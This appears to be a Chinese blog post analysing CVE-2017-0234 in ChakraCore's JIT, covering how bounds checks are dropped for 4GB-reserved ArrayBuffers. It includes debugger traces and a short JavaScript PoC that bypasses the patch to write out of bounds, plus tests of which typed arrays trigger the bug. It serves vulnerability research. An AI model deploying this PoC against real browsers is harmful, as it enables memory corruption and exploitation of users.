<p>要分析patch，可以先看一下patch后现在的JIT代码是什么样，跟进JIT。<br>在这下个断点，跟到JIT里<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg" alt=""><br>再在JIT里下断点<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071218.jpg" alt=""><br>继续执行到断点，并单步跟进<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg" alt=""></p>
<h4 id="分析patch后汇编"><a href="#分析patch后汇编" class="headerlink" title="分析patch后汇编"></a>分析patch后汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960000  mov         rax,1DFAB6B0A78h  </span><br><span class="line">000001E8AB96000A  mov         rax,qword ptr [rax]  </span><br><span class="line">000001E8AB96000D  add         rax,1C20h  </span><br><span class="line">000001E8AB960014  jo          000001E8AB960376  </span><br><span class="line">000001E8AB96001A  cmp         rsp,rax  </span><br><span class="line">000001E8AB96001D  jle         000001E8AB960376  </span><br><span class="line">000001E8AB960023  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB960027  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB96002B  mov         qword ptr [rsp+20h],r9  </span><br><span class="line">000001E8AB960030  mov         qword ptr [rsp+18h],r8  </span><br><span class="line">000001E8AB960035  mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">000001E8AB96003A  mov         qword ptr [rsp+8],rcx  </span><br><span class="line">000001E8AB96003F  push        rbp  </span><br><span class="line">000001E8AB960041  mov         rbp,rsp  </span><br><span class="line">000001E8AB960044  sub         rsp,30h  </span><br><span class="line">000001E8AB960048  push        r15  </span><br><span class="line">000001E8AB96004A  push        r14  </span><br><span class="line">000001E8AB96004C  push        r13  </span><br><span class="line">000001E8AB96004E  push        r12  </span><br><span class="line">000001E8AB960050  push        rdi  </span><br><span class="line">000001E8AB960052  push        rsi  </span><br><span class="line">000001E8AB960054  push        rbx  </span><br><span class="line">000001E8AB960056  sub         rsp,28h  </span><br><span class="line">000001E8AB96005A  mov         rbx,1DFAB6701C0h  </span><br><span class="line">000001E8AB960064  mov         rsi,7FFA484B2198h  </span><br><span class="line">000001E8AB96006E  mov         rdi,1E7AB7C47C4h  </span><br><span class="line">000001E8AB960078  mov         r12,qword ptr [rbp+20h]  </span><br><span class="line">000001E8AB96007C  mov         r13,qword ptr [r12+160h]  </span><br><span class="line">000001E8AB960084  mov         r14,qword ptr [r12+168h]  </span><br><span class="line">000001E8AB96008C  mov         r15,qword ptr [r12+158h]  </span><br><span class="line">000001E8AB960094  mov         rax,qword ptr [r12+170h]  </span><br><span class="line">000001E8AB96009C  xor         ecx,ecx  </span><br><span class="line">000001E8AB96009E  mov         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600A5  mov         byte ptr [rbx+41BBAh],3  </span><br><span class="line">000001E8AB9600AC  mov         rdx,qword ptr [rdi+1784Ch]  </span><br><span class="line">000001E8AB9600B3  mov         rdx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB9600B7  mov         byte ptr [rbx+41BBAh],0  </span><br><span class="line">000001E8AB9600BE  cmp         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600C5  jne         000001E8AB9601CE  </span><br><span class="line">000001E8AB9600CB  mov         r8,r13  </span><br><span class="line">000001E8AB9600CE  mov         r9,r8  </span><br><span class="line">000001E8AB9600D1  shr         r9,30h  </span><br><span class="line">000001E8AB9600D5  cmp         r9,1  </span><br><span class="line">000001E8AB9600D9  jne         000001E8AB9601E4  </span><br><span class="line">000001E8AB9600DF  mov         r8d,r8d  </span><br><span class="line">000001E8AB9600E2  mov         r9,rax  </span><br><span class="line">000001E8AB9600E5  mov         r10,r9  </span><br><span class="line">000001E8AB9600E8  shr         r10,30h  </span><br><span class="line">000001E8AB9600EC  cmp         r10,1  </span><br><span class="line">000001E8AB9600F0  jne         000001E8AB960231  </span><br><span class="line">000001E8AB9600F6  mov         r9d,r9d  </span><br><span class="line">000001E8AB9600F9  mov         r10,r15  </span><br><span class="line">000001E8AB9600FC  mov         r11,r10  </span><br><span class="line">000001E8AB9600FF  shr         r11,30h  </span><br><span class="line">000001E8AB960103  cmp         r11,1  </span><br><span class="line">000001E8AB960107  jne         000001E8AB96028A  </span><br><span class="line">000001E8AB96010D  mov         r10d,r10d  </span><br><span class="line">000001E8AB960110  mov         r11,rdx  </span><br><span class="line">000001E8AB960113  shr         r11,30h  </span><br><span class="line">000001E8AB960117  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB96011D  cmp         qword ptr [rdx],rsi  </span><br><span class="line">000001E8AB960120  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB960126  mov         esi,dword ptr [rdx+20h]  </span><br><span class="line">000001E8AB960129  cmp         r10d,esi  ----&gt;比较索引上界是否超出数组内存边界（检查上界）</span><br></pre></td></tr></table></figure>
<ul>
<li>比较索引上界是否超出数组长度（检查上界）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg" alt=""></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB96012C  jg          000001E8AB9602F7  </span><br><span class="line">000001E8AB960132  mov         rbx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB960136  mov         rsi,1DFAB6B0A78h  </span><br><span class="line">000001E8AB960140  cmp         rsp,qword ptr [rsi]  </span><br><span class="line">000001E8AB960143  jle         000001E8AB96032A  </span><br><span class="line">000001E8AB960149  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">000001E8AB96014F  inc         ecx  </span><br><span class="line">000001E8AB960151  cmp         r9d,r10d  -----&gt;比较索引值是否到达索引上界</span><br></pre></td></tr></table></figure>
<ul>
<li><p>比较索引值是否到达索引上界<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960154  jge         000001E8AB96019A  </span><br><span class="line">000001E8AB960156  test        r9d,r9d  </span><br><span class="line">000001E8AB960159  js          000001E8AB96033C  </span><br><span class="line">000001E8AB96015F  mov         rsi,r14  </span><br><span class="line">000001E8AB960162  mov         r11,rsi  </span><br><span class="line">000001E8AB960165  shr         r11,30h  </span><br><span class="line">000001E8AB960169  cmp         r11,1  </span><br><span class="line">000001E8AB96016D  jne         000001E8AB960358  </span><br><span class="line">000001E8AB960173  mov         esi,esi  </span><br><span class="line">000001E8AB960175  mov         dword ptr [rbx+r9*4],esi  -----&gt;数组赋值</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组赋值<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg" alt=""></p>
</li>
</ul>
<h4 id="关于patch的思考"><a href="#关于patch的思考" class="headerlink" title="关于patch的思考"></a>关于patch的思考</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br></pre></td></tr></table></figure>
<p>要绕过patch再次触发就要进入这个if body，(static_cast<uint64>(upperBound) &lt;&lt; indirScale)的限制是要小于4GB，这应该和内存分配有关。<br><code>var buffer = new ArrayBuffer(0x10000);</code><br>能否在进入if body的同时，又能OOB超出数组长度，就是后面需要思考的问题。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IntConstantBounds idxConstantBounds;</span><br><span class="line">                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">                    &#123;</span><br><span class="line">                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">                        int32 upperBound = idxConstantBounds.LowerBound();</span><br></pre></td></tr></table></figure></uint64></p>
<p>该段代码表示了程序试图获取ConstantBounds来赋值给idxConstantBounds从而控制upperBound&amp;lowerBound<br>因此PoC中需要构造常数边界来控制upperBound&amp;upperBound从而控制下列判断：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//回溯分析</span><br><span class="line">//rax = idxOpnd</span><br><span class="line">//if (idxOpnd) </span><br><span class="line">//idxSym = idxOpnd-&gt;m_sym;</span><br><span class="line">        //&#123;</span><br><span class="line">                    //test rax,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rax+8]</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rcx,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //StackSym::GetTypeEquivSym(IRType type, Func *func)</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rcx+30h]</span><br><span class="line">        //&#125;</span><br><span class="line">//Value * idxValue = FindValue(idxSym); //rax</span><br><span class="line">//IntConstantBounds idxConstantBounds; //rax</span><br><span class="line">//if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds)) //rax</span><br></pre></td></tr></table></figure>
<p>经过测试，在patch了的函数那里下断，跟进到这个if判断,得到有限制的bypass patch PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">j,number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++) <span class="comment">//create jit code</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=<span class="number">0x6000000</span>) view[j]=number;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x1234</span>,<span class="number">1</span>) <span class="comment">//jit create</span></span><br><span class="line">write(<span class="number">0x123456</span>,<span class="number">1</span>) <span class="comment">//bypass(limited) patch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov     r8,qword ptr [rbp-78h]= 0600000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//R8  = 06000000 00000000</span></span><br><span class="line"><span class="comment">//       high      low</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//test        r8d,r8d   r8d=0</span></span><br><span class="line"><span class="comment">//shr         r8,20h    r8=0x0000000006000000</span></span><br><span class="line"><span class="comment">//movsxd      rdx,r8d   rdx=0x06000000</span></span><br><span class="line"><span class="comment">//movzx       ecx,al    al=2</span></span><br><span class="line"><span class="comment">//shl         rdx,cl </span></span><br><span class="line"><span class="comment">//mov         rax,100000000h </span></span><br><span class="line"><span class="comment">//cmp         rdx,rax</span></span><br></pre></td></tr></table></figure></p>
<h3 id="更多的思考"><a href="#更多的思考" class="headerlink" title="更多的思考"></a>更多的思考</h3><p><del>chakra为什么这么优化，它涉及怎样的一个pattern，这样优化和buffer相关的点有哪些？</del></p>
<ol>
<li>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）</li>
<li>PoC能否修改？怎么修改？思考如下：</li>
</ol>
<ul>
<li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li>
<li>是否一定用到循环？去掉循环行不行？怎么精简PoC?</li>
</ul>
<h3 id="JIT优化-amp-amp-内存分配"><a href="#JIT优化-amp-amp-内存分配" class="headerlink" title="JIT优化&amp;&amp;内存分配"></a>JIT优化&amp;&amp;内存分配</h3><p>经过进一步对内存分配的调试（首先我在windbg里对windows API下断,参考了<a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/" target="_blank" rel="noopener">这篇</a>，然后回溯确实跟到了VirtualAlloc，不过和我找的不是同一个。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp KERNEL32!VirtualAllocStub</span><br><span class="line">0:000&gt; g</span><br><span class="line">ModLoad: 00007ffc`0e250000 00007ffc`0fc52000   D:\chakracore\ChakraCore\Build\VcBuild\bin\x64_debug\chakracore.dll</span><br><span class="line">ModLoad: 00007ffc`55f90000 00007ffc`560d5000   C:\windows\System32\ole32.dll</span><br><span class="line">ModLoad: 00007ffc`54030000 00007ffc`54057000   C:\windows\System32\GDI32.dll</span><br><span class="line">ModLoad: 00007ffc`529c0000 00007ffc`52b47000   C:\windows\System32\gdi32full.dll</span><br><span class="line">ModLoad: 00007ffc`53780000 00007ffc`538ca000   C:\windows\System32\USER32.dll</span><br><span class="line">ModLoad: 00007ffc`529a0000 00007ffc`529be000   C:\windows\System32\win32u.dll</span><br><span class="line">ModLoad: 00007ffc`53f10000 00007ffc`53f69000   C:\windows\System32\sechost.dll</span><br><span class="line">ModLoad: 00007ffc`53b90000 00007ffc`53c31000   C:\windows\System32\ADVAPI32.dll</span><br><span class="line">ModLoad: 00007ffc`406c0000 00007ffc`40869000   C:\windows\SYSTEM32\dbghelp.dll</span><br><span class="line">ModLoad: 00007ffc`40b50000 00007ffc`40b79000   C:\windows\SYSTEM32\dbgcore.DLL</span><br><span class="line">ModLoad: 00007ffc`54190000 00007ffc`541bd000   C:\windows\System32\IMM32.DLL</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">KERNEL32!VirtualAllocStub:</span><br><span class="line">00007ffc`53f99800 48ff2569c60500  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffc`53ff5e70)] ds:00007ffc`53ff5e70=&#123;KERNELBASE!VirtualAlloc (00007ffc`532aafc0)&#125;</span><br><span class="line">…</span><br><span class="line">0:000&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 00000030`208fec08 00007ffc`0e34bfe2 KERNEL32!VirtualAllocStub</span><br><span class="line">01 00000030`208fec10 00007ffc`0e252610 chakracore!Memory::X64WriteBarrierCardTableManager::Initialize+0x82 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 232] </span><br><span class="line">02 00000030`208fec70 00007ffc`0f0e647d chakracore!`dynamic initializer for &apos;Memory::RecyclerWriteBarrierManager::cardTable&apos;&apos;+0x10 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 29] </span><br><span class="line">03 00000030`208feca0 00007ffc`0f0641bd chakracore!_initterm+0x5d [d:\th\minkernel\crts\ucrt\src\appcrt\startup\initterm.cpp @ 22] </span><br><span class="line">04 00000030`208fece0 00007ffc`0f0640b7 chakracore!dllmain_crt_process_attach+0xbd [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 67] </span><br><span class="line">05 00000030`208fed30 00007ffc`0f064345 chakracore!dllmain_crt_dispatch+0x47 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 133] </span><br><span class="line">06 00000030`208fed70 00007ffc`0f0644c1 chakracore!dllmain_dispatch+0x75 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 190] </span><br><span class="line">07 00000030`208fedc0 00007ffc`5622485f chakracore!_DllMainCRTStartup+0x31 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 249] </span><br><span class="line">08 00000030`208fedf0 00007ffc`5624d762 ntdll!LdrpCallInitRoutine+0x6b</span><br><span class="line">09 00000030`208fee60 00007ffc`5624d5ab ntdll!LdrpInitializeNode+0x15a</span><br><span class="line">0a 00000030`208fef80 00007ffc`56247045 ntdll!LdrpInitializeGraphRecurse+0x73</span><br><span class="line">0b 00000030`208fefc0 00007ffc`5621d690 ntdll!LdrpPrepareModuleForExecution+0xc5</span><br><span class="line">0c 00000030`208ff000 00007ffc`5621d273 ntdll!LdrpLoadDllInternal+0x1a4</span><br><span class="line">0d 00000030`208ff080 00007ffc`5621c3cc ntdll!LdrpLoadDll+0x107</span><br><span class="line">0e 00000030`208ff220 00007ffc`5328eb02 ntdll!LdrLoadDll+0x8c</span><br><span class="line">0f 00000030`208ff320 00007ffc`532ba6d1 KERNELBASE!LoadLibraryExW+0x152</span><br><span class="line">10 00000030`208ff390 00007ff6`ee0d5509 KERNELBASE!LoadLibraryExA+0x31</span><br><span class="line">11 00000030`208ff3d0 00007ff6`ee0d55e9 CH!LoadChakraCore+0x19 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 38] </span><br><span class="line">12 00000030`208ff400 00007ff6`ee0d51ac CH!ChakraRTInterface::LoadChakraDll+0xd9 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 67] </span><br><span class="line">13 00000030`208ff7b0 00007ff6`ee0efee4 CH!wmain+0x61c [d:\chakracore\chakracore\bin\ch\ch.cpp @ 942] </span><br><span class="line">14 00000030`208ff910 00007ff6`ee0efdf7 CH!invoke_main+0x34 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 80] </span><br><span class="line">15 00000030`208ff950 00007ff6`ee0efcbe CH!__scrt_common_main_seh+0x127 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 253] </span><br><span class="line">16 00000030`208ff9b0 00007ff6`ee0efef9 CH!__scrt_common_main+0xe [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 296] </span><br><span class="line">17 00000030`208ff9e0 00007ffc`53f92784 CH!wmainCRTStartup+0x9 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17] </span><br><span class="line">18 00000030`208ffa10 00007ffc`56270d51 KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">19 00000030`208ffa40 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span><br></pre></td></tr></table></figure></p>
<p>于是全局搜索MEM_COMMIT，在ArrayBuffer.h里找到线索，并调试确认。<br>结论如下：<br>在为ArrayBuffer进行内存分配时，会对长度有一个判断。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg" alt=""><br>并根据这个判断的返回结果，决定使用Virtual Alloc（AllocWrapper是一个包装）还是malloc来分配内存。<br>这主要是根据length的长度和”标志位“。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032100.jpg" alt=""><br>如果是用Virtual Alloc分配(关于这种分配方式的参数，可以参考<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85" target="_blank" rel="noopener">MSDN</a>.aspx))<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg" alt=""><br>那么为ArrayBuffer分配的保留空间大小为4GB<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032430.jpg" alt=""><br>随后COMMIT真正使用的大小，也就是PoC里的0x10000<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg" alt=""></p>
<p>JIT在优化的时候会因为我们给这个Buffer分配的内存足够大（4GB），就去掉了边界检查，但其实这是一个安全隐患。</p>
<h3 id="Pattern匹配"><a href="#Pattern匹配" class="headerlink" title="Pattern匹配"></a>Pattern匹配</h3><p>我尝试着替换ArrayBuffer，寻找和此处bug逻辑相似的地方，在源码里搜索，不过暂时没有找到疑似的地方。</p>
<h3 id="触发条件-修改PoC"><a href="#触发条件-修改PoC" class="headerlink" title="触发条件(修改PoC)"></a>触发条件(修改PoC)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">         !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">         ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">           baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">           !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">         )</span><br><span class="line">        )</span><br><span class="line">     &#123;</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>替换控制ArrayBuffer的对象</li>
<li>测试case</li>
</ol>
<h4 id="TypeView"><a href="#TypeView" class="headerlink" title="TypeView"></a>TypeView</h4><p>PoC里用的是Uint32Array，其实TypedView只要宽度大于一个字节都是可以的<br>下面这些都测试成功。（其实主要常用的写exp的还是FloatArray）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Uint8Array();-</span><br><span class="line">Uint16Array();+</span><br><span class="line">Uint32Array();+</span><br><span class="line"></span><br><span class="line">Int8Array();-</span><br><span class="line">Int16Array();+</span><br><span class="line">Int32Array();+</span><br><span class="line"></span><br><span class="line">Float32Array();+</span><br><span class="line">Float64Array();+</span><br></pre></td></tr></table></figure></p>
<h4 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h4><ul>
<li>JSObject<ul>
<li>JSArray<ul>
<li>JSArrayBuffer</li>
<li>JSArrayBufferView<ul>
<li>JSTypedArray</li>
<li>JSDataView</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>ArrayBuffer需要用TypedArray或DataView来实际访问。<br>而为了Exploit，最好不要做多余的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br>不过我这里还是测试了一下DataView，没有成功。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step)</span><br><span class="line">     view.setInt32(i,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ /d/chakracore/ChakraCore/Build/VcBuild/bin/x64_debug/ch.exe test3.js</span><br><span class="line">TypeError: DataView operation access beyond specified buffer length</span><br><span class="line">   at write (d:\cve-2017-0234\test3.js:3:6)</span><br><span class="line">   at Global code (d:\cve-2017-0234\test3.js:9:1)</span><br></pre></td></tr></table></figure>
